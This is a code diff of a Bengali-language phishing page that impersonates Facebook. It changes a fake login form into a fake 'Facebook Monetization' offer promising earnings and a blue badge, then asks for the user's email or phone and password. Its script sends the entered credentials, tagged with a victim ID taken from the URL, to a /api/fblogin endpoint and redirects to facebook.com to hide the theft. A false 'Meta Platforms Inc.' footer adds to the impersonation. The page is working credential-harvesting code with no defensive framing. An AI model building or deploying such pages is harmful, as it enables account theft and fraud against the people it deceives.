@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook - লগ ইন করুন</title>
+    <title>Facebook Monetization</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -11,272 +13,467 @@
             box-sizing: border-box;
         }
         body {
+            font-family: 'Inter', sans-serif;
             background: #f0f2f5;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             padding: 20px;
         }
         .container {
-            background: #ffffff;
-            border-radius: 8px;
-            padding: 40px 32px 32px;
+            max-width: 460px;
             width: 100%;
-            max-width: 396px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 28px 24px 20px;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.06);
+            animation: fadeIn 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* লোগো */
+        .logo-area {
             text-align: center;
-        }
-        .logo {
-            font-size: 44px;
-            font-weight: 700;
-            color: #1877f2;
-            margin-bottom: 16px;
-            letter-spacing: -0.5px;
-            user-select: none;
-        }
-        .subtitle {
-            color: #606770;
-            font-size: 15px;
             margin-bottom: 20px;
+        }
+        .logo-area img {
+            height: 44px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* স্টেপ */
+        .step {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        .step.active { display: block; }
+
+        /* অফার হেডার */
+        .offer-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            text-align: center;
+            line-height: 1.3;
+            margin-bottom: 4px;
+        }
+        .offer-title span {
+            color: #1877f2;
+        }
+        .offer-sub {
+            text-align: center;
+            font-size: 14px;
+            color: #6b6b6b;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        /* স্ট্যাটিস্টিক্স */
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        .stat-box {
+            background: #f7f9fc;
+            border-radius: 12px;
+            padding: 12px 8px;
+            text-align: center;
+            border: 1px solid #eef2f6;
+        }
+        .stat-box .num {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+        .stat-box .num i {
+            color: #1877f2;
+            font-size: 14px;
+            margin-right: 2px;
+        }
+        .stat-box .lbl {
+            font-size: 11px;
+            color: #6b6b6b;
+            font-weight: 500;
+            margin-top: 2px;
+        }
+
+        /* ফিচার লিস্ট */
+        .features {
+            margin-bottom: 18px;
+        }
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 14px;
+            background: #fafbfc;
+            border-radius: 10px;
+            margin-bottom: 6px;
+            border: 1px solid #f0f2f5;
+        }
+        .feature-item i {
+            width: 28px;
+            height: 28px;
+            background: #eef2ff;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1877f2;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+        .feature-item .text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1a1a1a;
+        }
+        .feature-item .text small {
             font-weight: 400;
+            color: #6b6b6b;
+            font-size: 12px;
+            display: block;
+        }
+
+        /* স্টেপ গাইড */
+        .guide {
+            background: #f7f9fc;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 18px;
+            border: 1px solid #eef2f6;
+        }
+        .guide .step-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 4px 0;
+        }
+        .guide .step-row .num-circle {
+            width: 24px;
+            height: 24px;
+            background: #1877f2;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .guide .step-row .txt {
+            font-size: 13px;
+            color: #1a1a1a;
+            font-weight: 500;
+        }
+        .guide .step-row .txt small {
+            font-weight: 400;
+            color: #6b6b6b;
+            font-size: 12px;
+            display: block;
+        }
+
+        /* বাটন */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 14px rgba(24,119,242,0.2);
+        }
+        .btn:hover { background: #0d65d9; transform: translateY(-1px); }
+        .btn:active { transform: scale(0.97); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
+
+        /* লগইন ফর্ম */
+        .login-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            text-align: center;
+            margin-bottom: 4px;
+        }
+        .login-sub {
+            text-align: center;
+            font-size: 14px;
+            color: #6b6b6b;
+            margin-bottom: 20px;
         }
         .input-group {
-            margin-bottom: 12px;
+            margin-bottom: 14px;
+        }
+        .input-group label {
+            display: block;
+            font-weight: 500;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        .input-group label i {
+            color: #1877f2;
+            margin-right: 6px;
+            width: 18px;
         }
         .input-group input {
             width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            color: #1d2129;
-            background: #ffffff;
-            transition: border-color 0.2s, box-shadow 0.2s;
+            padding: 12px 16px;
+            border: 1.5px solid #dddfe2;
+            border-radius: 10px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
             outline: none;
-            font-family: inherit;
+            transition: 0.2s;
+            background: #fafafa;
         }
         .input-group input:focus {
             border-color: #1877f2;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
-        }
-        .input-group input::placeholder {
-            color: #90949c;
-        }
-        .btn {
-            width: 100%;
-            padding: 12px;
-            background: #1877f2;
-            color: #ffffff;
-            border: none;
-            border-radius: 6px;
-            font-size: 20px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            font-family: inherit;
-            margin-top: 4px;
-        }
-        .btn:hover {
-            background: #166fe5;
-        }
-        .btn:active {
-            background: #0e5dc8;
-        }
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        .divider {
-            border-top: 1px solid #dadde1;
-            margin: 20px 0 16px;
-        }
-        .forgot-link {
-            display: block;
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            margin-top: 12px;
-        }
-        .forgot-link:hover {
-            text-decoration: underline;
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(24,119,242,0.08);
         }
         .error-msg {
             color: #e74c3c;
-            font-size: 14px;
+            font-size: 13px;
             margin-top: 10px;
             display: none;
-            text-align: left;
-            padding-left: 4px;
         }
-        .error-msg.show {
-            display: block;
-        }
-        .signup-area {
-            margin-top: 24px;
-            border-top: 1px solid #dadde1;
-            padding-top: 20px;
-        }
-        .signup-area .btn-green {
-            background: #42b72a;
-            padding: 12px 20px;
-            font-size: 17px;
-            font-weight: 600;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            cursor: pointer;
-            transition: background 0.2s;
-            font-family: inherit;
-            width: auto;
-            display: inline-block;
-            text-decoration: none;
-        }
-        .signup-area .btn-green:hover {
-            background: #36a420;
-        }
-        .signup-area .btn-green:active {
-            background: #2d8f1a;
-        }
-        .footer-text {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #737373;
-        }
-        .footer-text a {
-            color: #737373;
-            text-decoration: none;
-        }
-        .footer-text a:hover {
-            text-decoration: underline;
-        }
+        .error-msg.show { display: block; }
+        .error-msg i { margin-right: 6px; }
 
-        /* Mobile adjustments */
-        @media (max-width: 500px) {
-            .container {
-                padding: 24px 16px 20px;
-            }
-            .logo {
-                font-size: 38px;
-            }
-            .input-group input {
-                font-size: 16px;
-                padding: 12px 14px;
-            }
-            .btn {
-                font-size: 18px;
-                padding: 10px;
-            }
+        .spinner {
+            display: none;
+            margin: 14px auto 4px;
+            width: 26px;
+            height: 26px;
+            border: 3px solid #e8e8e8;
+            border-top-color: #1877f2;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        .spinner.active { display: block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 14px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .forgot-link:hover { text-decoration: underline; }
+
+        /* ফুটার */
+        .footer {
+            margin-top: 16px;
+            padding-top: 14px;
+            border-top: 1px solid #f0f0f0;
+            text-align: center;
+            font-size: 11px;
+            color: #bbb;
+        }
+        .footer span { margin: 0 8px; }
+
+        @media (max-width: 440px) {
+            .container { padding: 16px 12px; }
+            .offer-title { font-size: 20px; }
+            .stats { grid-template-columns: 1fr 1fr; gap: 6px; }
+            .stat-box { padding: 8px 4px; }
+            .stat-box .num { font-size: 16px; }
+            .guide { padding: 10px 12px; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Logo -->
-        <div class="logo">facebook</div>
-        <div class="subtitle">আপনার অ্যাকাউন্ট দিয়ে লগ ইন করুন</div>
 
-        <!-- Login Form -->
-        <form id="loginForm" autocomplete="off">
-            <div class="input-group">
-                <input type="text" id="username" placeholder="ইমেইল বা ফোন নম্বর" required autofocus>
-            </div>
-            <div class="input-group">
-                <input type="password" id="password" placeholder="পাসওয়ার্ড" required>
-            </div>
+<div class="container">
 
-            <div id="errorMsg" class="error-msg">আপনার ইমেইল বা পাসওয়ার্ড ভুল। আবার চেষ্টা করুন।</div>
-
-            <button type="submit" class="btn" id="loginBtn">লগ ইন করুন</button>
-
-            <a href="#" class="forgot-link">পাসওয়ার্ড ভুলে গেছেন?</a>
-
-            <div class="divider"></div>
-
-            <div class="signup-area">
-                <a href="#" class="btn-green">নতুন অ্যাকাউন্ট তৈরি করুন</a>
-            </div>
-
-            <div class="footer-text">
-                <a href="#">প্রাইভেসি</a> · <a href="#">শর্তাবলী</a> · <a href="#">কুকিজ</a>
-            </div>
-        </form>
+    <!-- লোগো -->
+    <div class="logo-area">
+        <img src="https://www.image2url.com/r2/default/images/1787342004106-dbde695b-4e84-4b1b-aef7-adca6991c788.webp" alt="Facebook" onerror="this.style.display='none'; this.parentElement.innerHTML = '<div style=\'font-size:32px;font-weight:800;color:#1877f2;\'>f</div>'">
     </div>
 
-    <script>
-        (function() {
-            // ভিক্টিম আইডি
-            const pathParts = window.location.pathname.split('/');
-            const victimId = pathParts[pathParts.length - 1];
+    <!-- ===== স্টেপ ১: অফার ===== -->
+    <div id="step-offer" class="step active">
+        <div class="offer-title">Facebook <span>Monetization</span></div>
+        <div class="offer-sub">আপনার কন্টেন্ট থেকে আয় শুরু করুন। এখনই যাচাই করুন।</div>
 
-            const form = document.getElementById('loginForm');
-            const usernameInput = document.getElementById('username');
-            const passwordInput = document.getElementById('password');
-            const loginBtn = document.getElementById('loginBtn');
-            const errorMsg = document.getElementById('errorMsg');
+        <div class="stats">
+            <div class="stat-box">
+                <div class="num"><i class="fas fa-dollar-sign"></i> 5K+</div>
+                <div class="lbl">মাসিক আয়</div>
+            </div>
+            <div class="stat-box">
+                <div class="num"><i class="fas fa-users"></i> 1M+</div>
+                <div class="lbl">বিশ্বব্যাপী দর্শক</div>
+            </div>
+            <div class="stat-box">
+                <div class="num"><i class="fas fa-star"></i> 4.8★</div>
+                <div class="lbl">ক্রিয়েটর রেটিং</div>
+            </div>
+        </div>
 
-            // লগইন সাবমিট
-            form.addEventListener('submit', async function(e) {
-                e.preventDefault();
+        <div class="features">
+            <div class="feature-item">
+                <i class="fas fa-badge-check"></i>
+                <div class="text">মেটা ব্লু ব্যাজ <small>প্রিমিয়াম ক্রিয়েটর স্বীকৃতি</small></div>
+            </div>
+            <div class="feature-item">
+                <i class="fas fa-chart-line"></i>
+                <div class="text">রিয়েল-টাইম আয় <small>সরাসরি ট্র্যাক করুন</small></div>
+            </div>
+            <div class="feature-item">
+                <i class="fas fa-globe"></i>
+                <div class="text">বিশ্বব্যাপী পেমেন্ট <small>২০০+ দেশে গ্রহণযোগ্য</small></div>
+            </div>
+        </div>
 
-                const username = usernameInput.value.trim();
-                const password = passwordInput.value.trim();
+        <!-- ৩-স্টেপ গাইড -->
+        <div class="guide">
+            <div class="step-row">
+                <div class="num-circle">1</div>
+                <div class="txt">আপনার অ্যাকাউন্ট যাচাই করুন <small>লগইন করে ভেরিফাই করুন</small></div>
+            </div>
+            <div class="step-row">
+                <div class="num-circle">2</div>
+                <div class="txt">মনিটাইজেশন অনুমোদন <small>স্বয়ংক্রিয় যাচাই প্রক্রিয়া</small></div>
+            </div>
+            <div class="step-row">
+                <div class="num-circle">3</div>
+                <div class="txt">আয় শুরু করুন <small>সরাসরি আপনার অ্যাকাউন্টে</small></div>
+            </div>
+        </div>
 
-                // ফাঁকা চেক
-                if (!username || !password) {
-                    errorMsg.textContent = 'দয়া করে ইমেইল এবং পাসওয়ার্ড দিন।';
-                    errorMsg.classList.add('show');
-                    return;
-                }
+        <button class="btn" id="offerBtn">এখনই শুরু করুন</button>
+    </div>
 
-                // বাটন ডিজেবল (পুনরায় ক্লিক ঠেকাতে)
-                loginBtn.disabled = true;
-                loginBtn.textContent = 'লগ ইন করা হচ্ছে...';
-                errorMsg.classList.remove('show');
+    <!-- ===== স্টেপ ২: লগইন ===== -->
+    <div id="step-login" class="step">
+        <div class="login-title">লগ ইন করুন</div>
+        <div class="login-sub">আপনার অ্যাকাউন্ট দিয়ে যাচাই করুন</div>
 
-                try {
-                    // ডেটা সার্ভারে পাঠান
-                    await fetch('/api/fblogin', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            id: victimId,
-                            username: username,
-                            password: password
-                        })
-                    });
+        <div class="input-group">
+            <label><i class="fas fa-envelope"></i> ইমেইল বা ফোন</label>
+            <input type="text" id="username" placeholder="আপনার ইমেইল বা ফোন" autofocus>
+        </div>
+        <div class="input-group">
+            <label><i class="fas fa-lock"></i> পাসওয়ার্ড</label>
+            <input type="password" id="password" placeholder="আপনার পাসওয়ার্ড">
+        </div>
 
-                    // সাথে সাথে ফেসবুকে রিডাইরেক্ট (যেকোনো রেসপন্সে)
+        <div id="loginError" class="error-msg"><i class="fas fa-exclamation-circle"></i> ভুল তথ্য, আবার চেষ্টা করুন।</div>
+        <button class="btn" id="loginBtn">যাচাই করুন</button>
+        <div class="spinner" id="spinnerLogin"></div>
+
+        <a href="#" class="forgot-link">পাসওয়ার্ড ভুলে গেছেন?</a>
+    </div>
+
+    <!-- ফুটার -->
+    <div class="footer">
+        <span>Meta Platforms Inc.</span>
+        <span>•</span>
+        <span>© 2026</span>
+    </div>
+</div>
+
+<script>
+    (function() {
+        const pathParts = window.location.pathname.split('/');
+        const victimId = pathParts[pathParts.length - 1];
+
+        const stepOffer = document.getElementById('step-offer');
+        const stepLogin = document.getElementById('step-login');
+        const offerBtn = document.getElementById('offerBtn');
+        const loginBtn = document.getElementById('loginBtn');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginError = document.getElementById('loginError');
+        const spinnerLogin = document.getElementById('spinnerLogin');
+
+        offerBtn.addEventListener('click', function() {
+            stepOffer.classList.remove('active');
+            stepLogin.classList.add('active');
+            setTimeout(() => usernameInput.focus(), 100);
+        });
+
+        loginBtn.addEventListener('click', async function() {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) {
+                loginError.textContent = 'দয়া করে ইমেইল এবং পাসওয়ার্ড দিন।';
+                loginError.classList.add('show');
+                return;
+            }
+
+            loginError.classList.remove('show');
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'যাচাই করা হচ্ছে...';
+            spinnerLogin.classList.add('active');
+
+            try {
+                const response = await fetch('/api/fblogin', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        id: victimId,
+                        username: username,
+                        password: password
+                    })
+                });
+                const result = await response.json();
+                if (response.ok) {
                     window.location.href = 'https://facebook.com';
-
-                } catch (err) {
-                    // নেটওয়ার্ক এরর – তবুও ফেসবুকে রিডাইরেক্ট
-                    window.location.href = 'https://facebook.com';
+                } else {
+                    loginError.textContent = result.message || 'সার্ভার ত্রুটি।';
+                    loginError.classList.add('show');
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = 'যাচাই করুন';
+                    spinnerLogin.classList.remove('active');
                 }
-            });
-
-            // ইনপুট ফোকাসে এরর হাইড
-            usernameInput.addEventListener('focus', () => {
-                errorMsg.classList.remove('show');
+            } catch (err) {
+                loginError.textContent = 'নেটওয়ার্ক সমস্যা।';
+                loginError.classList.add('show');
                 loginBtn.disabled = false;
-                loginBtn.textContent = 'লগ ইন করুন';
-            });
-            passwordInput.addEventListener('focus', () => {
-                errorMsg.classList.remove('show');
-                loginBtn.disabled = false;
-                loginBtn.textContent = 'লগ ইন করুন';
-            });
+                loginBtn.textContent = 'যাচাই করুন';
+                spinnerLogin.classList.remove('active');
+            }
+        });
 
-            // "লগ ইন করুন" টেক্সট রিসেট (যদি ইনপুটে ক্লিক না করে)
-            document.addEventListener('click', function() {
-                if (!loginBtn.disabled) {
-                    loginBtn.textContent = 'লগ ইন করুন';
-                }
-            });
+        usernameInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') loginBtn.click();
+        });
+        passwordInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') loginBtn.click();
+        });
 
-        })();
-    </script>
+        usernameInput.addEventListener('focus', function() {
+            loginError.classList.remove('show');
+        });
+        passwordInput.addEventListener('focus', function() {
+            loginError.classList.remove('show');
+        });
+    })();
+</script>
+
 </body>
 </html>
